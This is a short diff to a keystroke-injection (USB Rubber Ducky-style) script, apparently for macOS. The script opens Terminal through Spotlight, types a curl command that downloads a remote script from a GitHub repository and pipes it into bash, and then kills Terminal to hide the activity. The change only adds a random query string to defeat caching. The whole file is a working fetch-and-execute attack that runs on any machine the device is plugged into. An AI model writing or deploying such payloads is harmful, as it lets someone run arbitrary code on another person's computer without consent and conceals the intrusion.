@@ -2,7 +2,7 @@ DEFAULT_DELAY 100
 COMMAND SPACE
 STRING terminal
 ENTER
-STRING curl -s https://raw.githubusercontent.com/kroneman/ducky-usb-fun/master/bin/waveshare_rp2040_payload_1 | bash
+STRING curl -s "https://raw.githubusercontent.com/kroneman/ducky-usb-fun/master/bin/waveshare_rp2040_payload_1?${RANDOM}" | bash
 ENTER
 STRING killall Terminal
 ENTER
